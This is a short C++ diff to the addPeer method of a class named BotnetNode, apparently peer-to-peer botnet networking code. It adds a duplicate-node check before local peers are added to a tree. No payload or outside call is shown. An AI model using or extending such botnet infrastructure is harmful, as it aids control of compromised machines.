@@ -67,14 +67,16 @@ struct sockaddr_in BotnetNode::addPeer(
 	
 	/* check if local peer */
 	if (pack->dst_peer.ip + pack->dst_peer.port == 0)
-	{
-		/* add to tree */
-		_branches.push_back(new BotnetNode(private_addr.sin_addr.s_addr, private_addr.sin_port));
-		pack->private_peer.ip == 0 ? *status = 1 : *status = 2; // successful local (reply back if 1).
-		return private_addr;
-	}
+		if (!findNode({ private_addr.sin_addr.s_addr, private_addr.sin_port }, hosts))
+		{
+			/* add to tree */
+			_branches.push_back(new BotnetNode(private_addr.sin_addr.s_addr, private_addr.sin_port));
+			pack->private_peer.ip == 0 ? *status = 1 : *status = 2; // successful local (reply back if 1).
+			return private_addr;
+		}
 
 	/* if peer is not in the network tree */
+	hosts.clear();
 	if (!findNode({ pack->dst_peer.ip, pack->dst_peer.port }, hosts)) 
 	{
 		/* create addr struct for peer (for direct communication) */
